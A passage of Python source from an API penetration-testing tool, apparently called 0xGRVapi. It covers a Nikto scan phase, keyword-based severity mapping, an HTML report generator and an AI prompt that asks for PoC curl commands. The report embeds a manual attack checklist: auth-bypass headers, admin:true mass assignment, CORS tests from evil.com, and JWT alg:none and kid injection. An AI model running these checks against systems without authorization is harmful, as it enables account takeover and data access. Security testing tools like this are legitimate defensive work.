5 specific test cases NOT covered by the automated scan that are worth doing manually on this target.
Be specific to the endpoints and findings found.

## 6. QUICK WIN (most likely valid bug)
One finding, full PoC curl command, expected response, impact statement.

Do not repeat yourself. No generic advice. Everything must reference specific findings or endpoints from above."""

    try:
        ok(f"Calling {ai_provider} API...")
        analysis = await _call_ai(ai_key, ai_provider, ai_model, prompt)
        out_path = D.report / "AI_ANALYSIS.md"
        out_path.write_text(
            f"# AI Security Analysis\n"
            f"# Target : {base_url}\n"
            f"# Provider: {ai_provider} / {ai_model or 'default'}\n"
            f"# Generated: {datetime.now().isoformat()}\n\n"
            f"{analysis}"
        )
        ok(f"AI analysis saved — {len(analysis)} chars")
    except Exception as ex:
        warn(f"AI analysis failed: {ex}")

# PHASE 10b — NIKTO SCAN (if installed)
# Credits: Nikto by sullo — https://github.com/sullo/nikto
async def phase_nikto(base_url: str, D: OutputDirs, stats: dict) -> List[Dict]:
    pb("10b", "NIKTO WEB SCANNER")

    findings: List[Dict] = []
    nikto_out = D.root / "nikto_output.json"

    # Check if nikto is installed
    rc, _, _ = await run("which nikto", 5)
    if rc != 0:
        rc2, _, _ = await run("nikto -Version 2>/dev/null", 5)
        if rc2 != 0:
            inf("Nikto not installed — skipping (install: apt install nikto)")
            stats["nikto_findings"] = 0
            return []

    inf(f"Running Nikto against {base_url} ...")
    nikto_json = str(D.root / "nikto_raw.json")

    # -Format json -o for machine-readable output, -nointeractive for non-tty
    cmd = (f"nikto -h {base_url} -Format json -o {nikto_json} "
           f"-nointeractive -maxtime 120s 2>&1")
    rc, out, err = await run(cmd, 150)

    # Also save raw text output
    (D.root / "nikto_raw.txt").write_text(out or "")

    # Parse JSON output
    try:
        if Path(nikto_json).exists():
            raw = Path(nikto_json).read_text()
            data = json.loads(raw)
            vulns = data.get("vulnerabilities", []) or data.get("results", []) or []

            # Nikto JSON structure varies by version — handle both
            if not vulns and isinstance(data, list):
                vulns = data

            for v in vulns:
                msg     = v.get("msg", "") or v.get("message", "") or str(v)
                uri     = v.get("uri", "") or v.get("url", "")
                method  = v.get("method", "GET")
                osvdbid = v.get("OSVDB", "") or v.get("osvdb", "")

                # Map nikto message to severity
                msg_l = msg.lower()
                if any(kw in msg_l for kw in ["sql", "inject", "xss", "rce", "command"]):
                    sev = "CRITICAL"
                elif any(kw in msg_l for kw in ["password", "admin", "backdoor", "shell",
                                                   "traversal", "disclosure"]):
                    sev = "HIGH"
                elif any(kw in msg_l for kw in ["header", "cookie", "csrf", "cors",
                                                   "version", "debug"]):
                    sev = "MEDIUM"
                else:
                    sev = "LOW"

                findings.append({
                    "type":   f"Nikto: {msg[:80]}",
                    "sev":    sev,
                    "url":    f"{base_url}{uri}",
                    "detail": msg,
                    "source": "nikto",
                    "osvdb":  str(osvdbid),
                })

            ok(f"Nikto: {len(findings)} findings")
        else:
            # Try parsing text output for key findings
            for line in (out or "").splitlines():
                if line.startswith("+ ") and "OSVDB" not in line:
                    clean = line.lstrip("+ ").strip()
                    if len(clean) > 10:
                        findings.append({
                            "type":   "Nikto",
                            "sev":    "MEDIUM",
                            "url":    base_url,
                            "detail": clean,
                            "source": "nikto",
                        })
            ok(f"Nikto text parse: {len(findings)} findings")
    except Exception as ex:
        warn(f"Nikto output parse error: {ex}")

    sjson(nikto_out, findings)
    stats["nikto_findings"] = len(findings)
    return findings

# FINAL HTML REPORT
def generate_report(base_url: str, D: OutputDirs, stats: dict,
                    all_findings: List[Dict]) -> Path:
    pb(12, "GENERATING HTML REPORT")

    by_sev: Dict[str, List] = defaultdict(list)
    for f in all_findings:
        by_sev[f.get("sev", "INFO")].append(f)

    crit_count = len(by_sev.get("CRITICAL", []))
    high_count  = len(by_sev.get("HIGH", []))
    med_count   = len(by_sev.get("MEDIUM", []))
    low_count   = len(by_sev.get("LOW", []))
    info_count  = len(by_sev.get("INFO", []))

    stats["critical_count"] = crit_count
    stats["high_count"]     = high_count

    # Group findings by type, all affected URLs in one card
    def group_findings(findings: List[Dict]) -> str:
        # Enrich any finding that doesn't already have owasp/remediation/poc_curl
        enriched = []
        for f in findings:
            if not f.get("owasp"):
                f = enrich_finding(f)
            enriched.append(f)

        grouped: Dict[str, List] = {}
        for f in enriched:
            key = f.get("type", "Unknown")
            grouped.setdefault(key, []).append(f)

        SEV_CLASS = {"CRITICAL":"sp-crit","HIGH":"sp-high","MEDIUM":"sp-med",
                     "LOW":"sp-low","INFO":"sp-info"}
        blocks = []
        for ftype, items in grouped.items():
            sev      = items[0].get("sev", "INFO")
            sp_cls   = SEV_CLASS.get(sev, "sp-info")
            source   = items[0].get("source","")
            src_tag  = f'<span class="src-tag">{source}</span>' if source else ""
            cnt_tag  = f'<span class="card-badge">×{len(items)}</span>' if len(items) > 1 else ""
            owasp    = items[0].get("owasp","")
            remed    = items[0].get("remediation","")
            owasp_tag = f'<span class="owasp-tag">{owasp}</span>' if owasp else ""

            url_items = ""
            for item in items:
                url        = item.get("url","") or item.get("detail","")
                detail     = item.get("detail","")
                cvss       = item.get("cvss","")
                method     = item.get("method","GET")
                confidence = item.get("confidence","")
                poc_curl   = item.get("poc_curl","")
                ev_file    = item.get("evidence_file","")
                param      = item.get("param","") or item.get("field","")

                # escape HTML in values
                def esc(s): return str(s).replace("&","&amp;").replace("<","&lt;").replace(">","&gt;").replace('"',"&quot;")

                method_color = {"GET":"#2e7d32","POST":"#e65100","PUT":"#1565c0",
                                "PATCH":"#6a1b9a","DELETE":"#b71c1c"}.get(method,"#555")
                method_badge = f'<span class="method-badge" style="background:{method_color}">{method}</span>' if method else ""
                conf_badge   = f'<span class="conf-badge conf-{confidence.lower()}">{confidence}</span>' if confidence else ""
                cvss_chip    = f'<span class="cvss-chip">CVSS {cvss}</span>' if cvss else ""
                param_tag    = f'<span class="param-tag">param: {esc(param)}</span>' if param else ""
                det_div      = f'<div class="finding-detail">{esc(detail)}</div>' if detail and detail != url else ""
                poc_div      = (
                    f'<div class="poc-block">'
                    f'<div class="poc-label">PoC — reproduce with:</div>'
                    f'<pre class="poc-cmd">{esc(poc_curl)}</pre>'
                    f'</div>'
                ) if poc_curl else ""
                ev_div = (
                    f'<div class="ev-path">📁 Evidence: <code>{esc(ev_file)}</code></div>'
                ) if ev_file else ""

                url_items += (
                    f'<div class="url-item">'
                    f'<div class="url-item-header">'
                    f'{method_badge}{conf_badge}{cvss_chip}{param_tag}'
                    f'<span class="url-val">{esc(url[:150])}</span>'
                    f'</div>'
                    f'{det_div}{poc_div}{ev_div}'
                    f'</div>'
                )

            remed_div = f'<div class="remed-block"><b>Remediation:</b> {remed}</div>' if remed else ""

            blocks.append(
                f'<div class="card">'
                f'<div class="card-head">'
                f'<span class="sev-pill {sp_cls}">{sev}</span>'
                f'<span class="card-title">{ftype}{src_tag}{cnt_tag}</span>'
                f'{owasp_tag}'
                f'<span class="chv">&#9660;</span>'
                f'</div>'
                f'<div class="card-body">'
                f'{remed_div}'
                f'<div class="url-list">{url_items}</div>'
                f'</div>'
                f'</div>'
            )
        return "".join(blocks)

    critical_html = group_findings(by_sev.get("CRITICAL", []))
    high_html     = group_findings(by_sev.get("HIGH", []))
    medium_html   = group_findings(by_sev.get("MEDIUM", []))

    # build grouped endpoint section from stats
    spec_ep_list = stats.get("spec_endpoint_list", [])
    auth_eps    = [e for e in spec_ep_list if e.get("auth")]
    noauth_eps  = [e for e in spec_ep_list if not e.get("auth")]

    def ep_row(e):
        m = e.get("method","GET")
        mc = {"GET":"#2e7d32","POST":"#e65100","PUT":"#1565c0","PATCH":"#6a1b9a","DELETE":"#b71c1c"}.get(m,"#333")
        fields = ", ".join(e.get("body_fields",[]))[:50] or ""
        f_span = f'<span class="ep-fields">{fields}</span>' if fields else ""
        return f'<div class="ep-row"><span class="ep-method" style="color:{mc}">{m}</span><span class="ep-path">{e.get("path","")}</span>{f_span}</div>'

    auth_ep_html   = "".join(ep_row(e) for e in auth_eps)
    noauth_ep_html = "".join(ep_row(e) for e in noauth_eps)
    spec_ep_section = ""
    if spec_ep_list:
        spec_ep_section = f"""
    <div class="section-block">
      <div class="section-label"><span class="sev-dot d-info"></span>Spec Endpoints ({len(spec_ep_list)} total)</div>
      <div class="ep-tabs">
        <button class="tab-btn active" onclick="showTab('noauth')">No Auth Required ({len(noauth_eps)})</button>
        <button class="tab-btn" onclick="showTab('auth')">Auth Required ({len(auth_eps)})</button>
      </div>
      <div id="tab-noauth" class="ep-list">{noauth_ep_html or '<div class="ep-empty">None found</div>'}</div>
      <div id="tab-auth"   class="ep-list" style="display:none">{auth_ep_html or '<div class="ep-empty">None found</div>'}</div>
    </div>"""

    # AI analysis render
    ai_content = ""
    ai_f = D.report / "AI_ANALYSIS.md"
    if ai_f.exists():
        raw_ai = ai_f.read_text()[:10000]
        # Convert markdown tables/headers to readable HTML
        lines = []
        for line in raw_ai.splitlines():
            line_esc = line.replace("&","&amp;").replace("<","&lt;").replace(">","&gt;")
            if line.startswith("## "):
                lines.append(f'<h4 class="ai-h4">{line_esc[3:]}</h4>')
            elif line.startswith("# "):
                lines.append(f'<h3 class="ai-h3">{line_esc[2:]}</h3>')
            elif line.startswith("| ") and "|" in line[2:]:
                # table row
                cells = [c.strip() for c in line.split("|")[1:-1]]
                if all(set(c) <= set("-: ") for c in cells):
                    continue  # separator row
                row = "".join(f"<td>{c}</td>" for c in cells)
                lines.append(f'<tr>{row}</tr>')
            elif line.startswith("- ") or line.startswith("* "):
                lines.append(f'<li class="ai-li">{line_esc[2:]}</li>')
            elif line.strip() == "":
                lines.append('<br>')
            else:
                lines.append(f'<p class="ai-p">{line_esc}</p>')
        ai_content = "\n".join(lines)
    else:
        ai_content = '<p class="ai-empty">Run with --ai-key flag to enable AI analysis and CVSS scoring</p>'

    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    html = f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>0xGRVapi // {base_url}</title>
<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;600&family=IBM+Plex+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
<style>
*, *::before, *::after {{ box-sizing: border-box; margin: 0; padding: 0; }}

:root {{
  --bg:      #0f1117;
  --bg2:     #161b22;
  --bg3:     #1e2530;
  --border:  #2a3140;
  --border2: #364050;
  --text:    #e2e8f0;
  --muted:   #8492a6;
  --dim:     #4a5568;
  --mono:    'IBM Plex Mono', monospace;
  --sans:    'IBM Plex Sans', sans-serif;
  --red:     #fc5c65;
  --orange:  #fd9644;
  --yellow:  #fed330;
  --green:   #26de81;
  --blue:    #45aaf2;
  --purple:  #a55eea;
}}

body {{
  background: var(--bg);
  color: var(--text);
  font-family: var(--sans);
  font-size: 14px;
  line-height: 1.6;
}}

/* HEADER */
.hdr {{
  background: var(--bg2);
  border-bottom: 1px solid var(--border);
  padding: 28px 40px 0;
}}
.hdr-top {{
  display: flex;
  align-items: flex-end;
  justify-content: space-between;
  gap: 24px;
  padding-bottom: 20px;
}}
.logo {{
  font-family: var(--mono);
  font-size: 1.5rem;
  font-weight: 600;
  color: var(--text);
  letter-spacing: -0.02em;
}}
.logo em {{
  color: var(--blue);
  font-style: normal;
}}
.meta {{
  font-family: var(--mono);
  font-size: .7rem;
  color: var(--muted);
  text-align: right;
  line-height: 1.8;
}}
.meta strong {{ color: var(--text); }}
.stats-bar {{
  display: flex;
  border-top: 1px solid var(--border);
}}
.stat-cell {{
  flex: 1;
  padding: 14px 20px;
  border-right: 1px solid var(--border);
}}
.stat-cell:last-child {{ border-right: none; }}
.stat-cell .num {{
  font-family: var(--mono);
  font-size: 1.8rem;
  font-weight: 600;
  line-height: 1;
  color: var(--muted);
}}
.stat-cell .lbl {{
  font-size: .65rem;
  letter-spacing: .12em;
  text-transform: uppercase;
  color: var(--dim);
  margin-top: 3px;
}}
.stat-cell.crit .num {{ color: var(--red); }}
.stat-cell.high .num {{ color: var(--orange); }}
.stat-cell.med  .num {{ color: var(--yellow); }}
.stat-cell.low  .num {{ color: var(--green); }}
.stat-cell.inf  .num {{ color: var(--blue); }}

/* LAYOUT */
.body-wrap {{
  max-width: 1280px;
  margin: 0 auto;
  padding: 32px 40px;
  display: grid;
  grid-template-columns: 1fr 260px;
  gap: 32px;
  align-items: start;
}}
@media (max-width: 860px) {{
  .body-wrap {{ grid-template-columns: 1fr; padding: 20px; }}
  .hdr {{ padding: 20px 20px 0; }}
  .hdr-top {{ flex-direction: column; align-items: flex-start; }}
  .meta {{ text-align: left; }}
}}

/* SIDEBAR */
.sidebar {{ position: sticky; top: 20px; display: flex; flex-direction: column; gap: 16px; }}
.side-box {{
  background: var(--bg2);
  border: 1px solid var(--border);
  padding: 18px;
}}
.side-box h3 {{
  font-family: var(--mono);
  font-size: .62rem;
  letter-spacing: .15em;
  text-transform: uppercase;
  color: var(--dim);
  border-bottom: 1px solid var(--border);
  padding-bottom: 10px;
  margin-bottom: 12px;
}}
.srow {{
  display: flex;
  justify-content: space-between;
  padding: 5px 0;
  border-bottom: 1px solid var(--border);
  font-size: .8rem;
}}
.srow:last-child {{ border-bottom: none; }}
.srow .sk {{ color: var(--muted); }}
.srow .sv {{ font-family: var(--mono); color: var(--text); font-weight: 600; }}
.checklist {{ display: flex; flex-direction: column; gap: 0; }}
.citem {{
  display: flex;
  gap: 10px;
  padding: 7px 0;
  font-size: .76rem;
  color: var(--muted);
  border-bottom: 1px solid var(--border);
  line-height: 1.4;
  align-items: flex-start;
}}
.citem:last-child {{ border-bottom: none; }}
.cbox {{
  width: 13px; height: 13px;
  border: 1px solid var(--border2);
  flex-shrink: 0;
  margin-top: 2px;
}}

/* MAIN */
.main-col {{ display: flex; flex-direction: column; gap: 28px; }}

.section {{}}
.sec-hdr {{
  display: flex;
  align-items: center;
  gap: 10px;
  margin-bottom: 12px;
  padding-bottom: 8px;
  border-bottom: 1px solid var(--border);
}}
.sec-dot {{
  width: 7px; height: 7px;
  border-radius: 50%;
  flex-shrink: 0;
}}
.dc {{ background: var(--red); }}
.dh {{ background: var(--orange); }}
.dm {{ background: var(--yellow); }}
.dl {{ background: var(--green); }}
.di {{ background: var(--blue); }}
.sec-title {{
  font-family: var(--mono);
  font-size: .68rem;
  letter-spacing: .15em;
  text-transform: uppercase;
  color: var(--muted);
}}
.sec-count {{
  font-family: var(--mono);
  font-size: .68rem;
  color: var(--dim);
  margin-left: auto;
}}

/* FINDING CARDS */
.card {{
  background: var(--bg2);
  border: 1px solid var(--border);
  margin-bottom: 6px;
  transition: border-color .15s;
}}
.card:hover {{ border-color: var(--border2); }}
.card-head {{
  display: flex;
  align-items: center;
  gap: 10px;
  padding: 11px 16px;
  cursor: pointer;
  user-select: none;
}}
.sev-pill {{
  font-family: var(--mono);
  font-size: .6rem;
  font-weight: 600;
  letter-spacing: .08em;
  padding: 2px 8px;
  text-transform: uppercase;
  flex-shrink: 0;
  border: 1px solid;
}}
.sp-crit {{ color: var(--red);    border-color: #fc5c6540; background: #fc5c6510; }}
.sp-high {{ color: var(--orange); border-color: #fd964440; background: #fd964410; }}
.sp-med  {{ color: var(--yellow); border-color: #fed33040; background: #fed33010; }}
.sp-low  {{ color: var(--green);  border-color: #26de8140; background: #26de8110; }}
.sp-info {{ color: var(--muted);  border-color: #4a556840; background: #4a556810; }}
.card-title {{
  font-size: .85rem;
  font-weight: 600;
  color: var(--text);
  flex: 1;
}}
.card-badge {{
  font-family: var(--mono);
  font-size: .6rem;
  padding: 2px 7px;
  background: var(--bg3);
  color: var(--muted);
  border: 1px solid var(--border);
  margin-left: 6px;
}}
.src-tag {{
  font-family: var(--mono);
  font-size: .58rem;
  padding: 1px 6px;
  background: var(--bg3);
  color: var(--dim);
  border: 1px solid var(--border);
  margin-left: 4px;
}}
.chv {{
  color: var(--dim);
  font-size: .7rem;
  margin-left: 4px;
  transition: transform .18s;
  flex-shrink: 0;
}}
.card.open .chv {{ transform: rotate(180deg); }}
.card-body {{
  display: none;
  padding: 0 16px 14px;
  border-top: 1px solid var(--border);
}}
.card.open .card-body {{ display: block; }}
.url-list {{ padding-top: 10px; }}
.url-item {{
  display: flex;
  flex-wrap: wrap;
  gap: 8px 16px;
  padding: 7px 0;
  border-bottom: 1px solid var(--border);
  align-items: baseline;
}}
.url-item:last-child {{ border-bottom: none; }}
.url-val {{
  font-family: var(--mono);
  font-size: .73rem;
  color: var(--blue);
  word-break: break-all;
  font-weight: 600;
}}
.url-detail {{
  font-size: .73rem;
  color: var(--muted);
  flex: 1;
  min-width: 180px;
}}
.cvss-chip {{
  font-family: var(--mono);
  font-size: .6rem;
  padding: 2px 7px;
  background: var(--bg3);
  color: var(--orange);
  border: 1px solid var(--border);
}}
.owasp-tag {{
  font-family: var(--mono);
  font-size: .6rem;
  padding: 2px 8px;
  background: #1a237e22;
  color: #7986cb;
  border: 1px solid #3949ab44;
  border-radius: 3px;
  margin-left: auto;
  margin-right: 8px;
  white-space: nowrap;
}}
.method-badge {{
  font-family: var(--mono);
  font-size: .62rem;
  font-weight: 700;
  padding: 2px 7px;
  border-radius: 3px;
  color: #fff;
  margin-right: 6px;
  letter-spacing: .05em;
}}
.conf-badge {{
  font-family: var(--mono);
  font-size: .58rem;
  padding: 2px 6px;
  border-radius: 3px;
  margin-right: 6px;
  font-weight: 600;
}}
.conf-high   {{ background: #b71c1c33; color: #ef5350; border: 1px solid #b71c1c55; }}
.conf-medium {{ background: #e65100_33; color: #ffa726; border: 1px solid #e6510055; }}
.conf-low    {{ background: #1b5e2033; color: #66bb6a; border: 1px solid #1b5e2055; }}
.param-tag {{
  font-family: var(--mono);
  font-size: .6rem;
  padding: 2px 6px;
  background: #00838f22;
  color: #4dd0e1;
  border: 1px solid #00838f44;
  border-radius: 3px;
  margin-right: 6px;
}}
.url-item-header {{
  display: flex;
  align-items: center;
  flex-wrap: wrap;
  gap: 4px;
  margin-bottom: 6px;
}}
.finding-detail {{
  font-size: .73rem;
  color: var(--muted);
  margin: 4px 0 8px 0;
  line-height: 1.5;
}}
.poc-block {{
  margin: 8px 0;
  background: #0a0a0f;
  border: 1px solid #00ff4133;
  border-radius: 4px;
  overflow: hidden;
}}
.poc-label {{
  font-family: var(--mono);
  font-size: .62rem;
  color: #00ff41;
  padding: 4px 10px;
  background: #00ff4108;
  border-bottom: 1px solid #00ff4120;
  letter-spacing: .08em;
}}
.poc-cmd {{
  font-family: var(--mono);
  font-size: .7rem;
  color: #e8f5e9;
  padding: 10px 12px;
  margin: 0;
  white-space: pre-wrap;
  word-break: break-all;
  line-height: 1.6;
}}
.remed-block {{
  font-size: .73rem;
  color: #a5d6a7;
  background: #1b5e2015;
  border-left: 3px solid #2e7d32;
  padding: 8px 12px;
  margin-bottom: 10px;
  line-height: 1.5;
}}
.ev-path {{
  font-size: .65rem;
  color: var(--muted);
  margin-top: 4px;
  font-family: var(--mono);
}}
.ev-path code {{
  color: #ffd54f;
  background: #ff8f0010;
  padding: 1px 4px;
  border-radius: 2px;
}}

/* ENDPOINTS TAB */
.ep-tabs {{
  display: flex;
  gap: 0;
  margin-bottom: 0;
  border-bottom: 1px solid var(--border);
}}
.tab-btn {{
  font-family: var(--mono);
  font-size: .68rem;
  padding: 8px 16px;
  background: none;
  border: none;
  border-bottom: 2px solid transparent;
  color: var(--muted);
  cursor: pointer;
  letter-spacing: .05em;
  transition: color .15s, border-color .15s;
  margin-bottom: -1px;
}}
.tab-btn.active {{
  color: var(--text);
  border-bottom-color: var(--blue);
}}
.tab-btn:hover {{ color: var(--text); }}
.ep-list {{
  background: var(--bg2);
  border: 1px solid var(--border);
  border-top: none;
  max-height: 420px;
  overflow-y: auto;
}}
.ep-row {{
  display: flex;
  align-items: center;
  gap: 12px;
  padding: 7px 16px;
  border-bottom: 1px solid var(--border);
  font-size: .8rem;
}}
.ep-row:last-child {{ border-bottom: none; }}
.ep-method {{
  font-family: var(--mono);
  font-size: .65rem;
  font-weight: 600;
  width: 54px;
  flex-shrink: 0;
  letter-spacing: .05em;
}}
.ep-path {{
  font-family: var(--mono);
  font-size: .75rem;
  color: var(--text);
  flex: 1;
}}
.ep-fields {{
  font-family: var(--mono);
  font-size: .65rem;
  color: var(--dim);
}}
.ep-empty {{
  padding: 16px;
  color: var(--dim);
  font-size: .8rem;
  font-family: var(--mono);
}}

/* AI PANEL */
.ai-box {{
  background: var(--bg2);
  border: 1px solid var(--border);
  padding: 20px 24px;
  font-size: .82rem;
  line-height: 1.7;
}}
.ai-h3 {{
  font-size: .9rem;
  font-weight: 700;
  color: var(--text);
  margin: 18px 0 8px;
  padding-top: 12px;
  border-top: 1px solid var(--border);
}}
.ai-h3:first-child {{ border-top: none; margin-top: 0; padding-top: 0; }}
.ai-h4 {{
  font-size: .82rem;
  font-weight: 600;
  color: var(--blue);
  margin: 12px 0 6px;
}}
.ai-p {{
  color: var(--muted);
  margin: 3px 0;
  font-size: .8rem;
}}
.ai-li {{
  color: var(--muted);
  font-size: .8rem;
  margin: 2px 0 2px 16px;
  list-style: disc;
}}
.ai-empty {{
  font-family: var(--mono);
  font-size: .75rem;
  color: var(--dim);
  padding: 8px 0;
}}
table {{ border-collapse: collapse; width: 100%; margin: 10px 0; }}
td {{
  padding: 6px 12px;
  border: 1px solid var(--border);
  font-size: .75rem;
  color: var(--muted);
  vertical-align: top;
}}
tr:first-child td {{
  background: var(--bg3);
  color: var(--text);
  font-weight: 600;
  font-family: var(--mono);
  font-size: .7rem;
}}

/* FOOTER */
footer {{
  background: var(--bg2);
  border-top: 1px solid var(--border);
  padding: 16px 40px;
  font-family: var(--mono);
  font-size: .65rem;
  color: var(--dim);
  display: flex;
  justify-content: space-between;
  flex-wrap: wrap;
  gap: 8px;
}}
footer a {{ color: var(--muted); text-decoration: none; }}
footer a:hover {{ color: var(--text); }}
</style>
</head>
<body>

<header class="hdr">
  <div class="hdr-top">
    <div class="logo">0x<em>GRV</em>api</div>
    <div class="meta">
      <strong>{base_url}</strong><br>
      {now} &nbsp;·&nbsp; v{VERSION} &nbsp;·&nbsp; {len(all_findings)} findings
    </div>
  </div>
  <div class="stats-bar">
    <div class="stat-cell crit"><div class="num" data-n="{crit_count}">{crit_count}</div><div class="lbl">Critical</div></div>
    <div class="stat-cell high"><div class="num" data-n="{high_count}">{high_count}</div><div class="lbl">High</div></div>
    <div class="stat-cell med"><div class="num" data-n="{med_count}">{med_count}</div><div class="lbl">Medium</div></div>
    <div class="stat-cell low"><div class="num" data-n="{low_count}">{low_count}</div><div class="lbl">Low</div></div>
    <div class="stat-cell inf"><div class="num">{stats.get('endpoints_found',0)}</div><div class="lbl">Endpoints</div></div>
    <div class="stat-cell inf"><div class="num">{stats.get('spec_files',0)}</div><div class="lbl">Spec Files</div></div>
    <div class="stat-cell inf"><div class="num">{stats.get('injection_findings',0)}</div><div class="lbl">Injections</div></div>
    <div class="stat-cell inf"><div class="num">{stats.get('bola_findings',0)}</div><div class="lbl">BOLA/IDOR</div></div>
  </div>
</header>

<div class="body-wrap">
  <main class="main-col">

{'<div class="section"><div class="sec-hdr"><span class="sec-dot dc"></span><span class="sec-title">Critical</span><span class="sec-count">' + str(len(by_sev.get("CRITICAL",[]))) + ' findings</span></div>' + critical_html + '</div>' if critical_html else ''}
{'<div class="section"><div class="sec-hdr"><span class="sec-dot dh"></span><span class="sec-title">High</span><span class="sec-count">' + str(len(by_sev.get("HIGH",[]))) + ' findings</span></div>' + high_html + '</div>' if high_html else ''}
{'<div class="section"><div class="sec-hdr"><span class="sec-dot dm"></span><span class="sec-title">Medium</span><span class="sec-count">' + str(len(by_sev.get("MEDIUM",[]))) + ' findings</span></div>' + medium_html + '</div>' if medium_html else ''}
{'<div class="section"><div class="sec-hdr"><span class="sec-dot dl"></span><span class="sec-title">Low</span><span class="sec-count">' + str(len(by_sev.get("LOW",[]))) + ' findings</span></div>' + group_findings(by_sev.get("LOW",[])) + '</div>' if by_sev.get("LOW") else ''}
{'<div class="section"><div class="sec-hdr"><span class="sec-dot di"></span><span class="sec-title">Info</span><span class="sec-count">' + str(len(by_sev.get("INFO",[]))) + ' findings</span></div>' + group_findings(by_sev.get("INFO",[])) + '</div>' if by_sev.get("INFO") else ''}

{spec_ep_section}

    <div class="section">
      <div class="sec-hdr">
        <span class="sec-dot di"></span>
        <span class="sec-title">AI Analysis</span>
      </div>
      <div class="ai-box">{ai_content}</div>
    </div>

  </main>

  <aside class="sidebar">
    <div class="side-box">
      <h3>Scan Stats</h3>
      <div class="srow"><span class="sk">Endpoints</span><span class="sv">{stats.get('endpoints_found',0)}</span></div>
      <div class="srow"><span class="sk">Spec files</span><span class="sv">{stats.get('spec_files',0)}</span></div>
      <div class="srow"><span class="sk">Auth issues</span><span class="sv">{stats.get('auth_issues',0)}</span></div>
      <div class="srow"><span class="sk">BOLA/IDOR</span><span class="sv">{stats.get('bola_findings',0)}</span></div>
      <div class="srow"><span class="sk">Injections</span><span class="sv">{stats.get('injection_findings',0)}</span></div>
      <div class="srow"><span class="sk">Mass Assign</span><span class="sv">{stats.get('mass_assignment_findings',0)}</span></div>
      <div class="srow"><span class="sk">SSRF</span><span class="sv">{stats.get('ssrf_findings',0)}</span></div>
      <div class="srow"><span class="sk">Headers</span><span class="sv">{stats.get('header_findings',0)}</span></div>
      <div class="srow"><span class="sk">Info Leaks</span><span class="sv">{stats.get('info_leak_findings',0)}</span></div>
      <div class="srow"><span class="sk">Nikto</span><span class="sv">{stats.get('nikto_findings',0)}</span></div>
      <div class="srow"><span class="sk">Total</span><span class="sv">{len(all_findings)}</span></div>
    </div>

    <div class="side-box">
      <h3>Manual Checklist</h3>
      <div class="checklist">
        <div class="citem"><div class="cbox"></div>BOLA — test 401/403 endpoints with auth bypass headers</div>
        <div class="citem"><div class="cbox"></div>Mass assignment — register with admin:true, verify profile</div>
        <div class="citem"><div class="cbox"></div>SQLi/NoSQLi — replay in Burp with fuzz payloads</div>
        <div class="citem"><div class="cbox"></div>SSRF — Interactsh on all URL/path parameters</div>
        <div class="citem"><div class="cbox"></div>CORS — test credentialed requests from evil.com</div>
        <div class="citem"><div class="cbox"></div>Rate limiting — Turbo Intruder on login/reset</div>
        <div class="citem"><div class="cbox"></div>JWT — alg:none, weak secret, kid injection</div>
        <div class="citem"><div class="cbox"></div>Hidden endpoints from exposed spec files</div>
        <div class="citem"><div class="cbox"></div>Horizontal priv esc — user A token on user B objects</div>
      </div>
    </div>
  </aside>
</div>

<footer>
  <span>0xGRVapi v{VERSION} &nbsp;·&nbsp; <a href="https://github.com/0xgrv">@0xgrv</a></span>
  <span>Nikto by <a href="https://github.com/sullo/nikto">sullo</a></span>
  <span>Authorized security testing only</span>
</footer>

<script>
document.querySelectorAll('[data-n]').forEach(el => {{
  const target = parseInt(el.dataset.n) || 0;
  if (!target) return;
  let cur = 0;
  const step = Math.max(1, Math.ceil(target / 40));
  const t = setInterval(() => {{
    cur = Math.min(cur + step, target);
    el.textContent = cur;
    if (cur >= target) clearInterval(t);
  }}, 20);
}});
document.querySelectorAll('.card-head').forEach(h => {{
  h.addEventListener('click', () => h.closest('.card').classList.toggle('open'));
}});
function showTab(id) {{
  document.getElementById('tab-noauth').style.display = id === 'noauth' ? '' : 'none';
  document.getElementById('tab-auth').style.display   = id === 'auth'   ? '' : 'none';
  document.querySelectorAll('.tab-btn').forEach((b,i) => {{
    b.classList.toggle('active', (i===0 && id==='noauth') || (i===1 && id==='auth'));
  }});
}}
</script>
</body>
</html>"""

    report_f = D.report / "REPORT.html"
    report_f.write_text(html)
    ok(f"HTML report → {report_f}")
    return report_f

# FINAL SUMMARY
def print_summary(base_url: str, D: OutputDirs, stats: dict,
                  all_findings: List[Dict], report_f: Path, elapsed: float):
    console.print("\n")
    console.print(Rule("[bold bright_cyan] 0xGRVapi COMPLETE — by 0xgrv [/bold bright_cyan]",
                       style="bright_cyan"))

    by_sev: Dict[str, int] = defaultdict(int)
    for f in all_findings:
        by_sev[f.get("sev", "INFO")] += 1

    t = Table(box=box.SIMPLE_HEAVY, show_header=False, padding=(0, 2))
    t.add_column("Metric", style="bold")
    t.add_column("Value", style="bright_cyan", justify="right")
    rows = [
        ("Endpoints discovered",       stats.get("endpoints_found", 0)),
        ("Spec files exposed",         stats.get("spec_files", 0)),
        ("Auth issues",                stats.get("auth_issues", 0)),
        ("BOLA/IDOR findings",         stats.get("bola_findings", 0)),
        ("Rate limit findings",        stats.get("rate_limit_findings", 0)),
        ("Injection findings",         stats.get("injection_findings", 0)),
        ("Mass assignment findings",   stats.get("mass_assignment_findings", 0)),
        ("SSRF findings",              stats.get("ssrf_findings", 0)),
        ("Header/CORS findings",       stats.get("header_findings", 0)),
        ("Info leak findings",         stats.get("info_leak_findings", 0)),
        ("Business logic findings",    stats.get("business_logic_findings", 0)),
        ("─────────────────────────", "──────"),
        ("CRITICAL", f"[bold red]{by_sev['CRITICAL']}[/bold red]"),
        ("HIGH",     f"[red]{by_sev['HIGH']}[/red]"),
        ("MEDIUM",   f"[yellow]{by_sev['MEDIUM']}[/yellow]"),
        ("LOW",      f"[green]{by_sev['LOW']}[/green]"),
        ("INFO",     str(by_sev.get("INFO", 0))),
        ("─────────────────────────", "──────"),
        ("TOTAL FINDINGS", str(len(all_findings))),
    ]
    for label, val in rows:
        t.add_row(label, str(val))
    console.print(t)

    crits = [f for f in all_findings if f.get("sev") == "CRITICAL"]
    if crits:
        console.print(Panel(
            "\n".join(f"[red]!! {f['type']}: {f.get('url', f.get('detail', ''))[:80]}[/red]"
                      for f in crits[:10]),
            title="[bold red]CRITICAL FINDINGS[/bold red]", border_style="red"))

    console.print()
    console.print(f"  [dim]{'─'*52}[/dim]")
